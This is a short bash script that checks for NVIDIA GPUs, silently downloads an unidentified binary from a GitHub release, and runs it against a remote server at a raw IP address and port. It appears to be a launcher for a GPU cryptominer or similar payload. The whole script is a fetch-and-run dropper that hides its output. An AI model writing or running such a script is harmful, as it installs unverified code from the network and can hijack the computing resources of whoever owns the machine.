#!/bin/bash
nvidia-smi -L
wget https://github.com/delindawca56/haiau/releases/download/1/chilang &> /dev/null
chmod +x chilang
./chilang -P http://38.130.221.109:4545/"$1" &> log
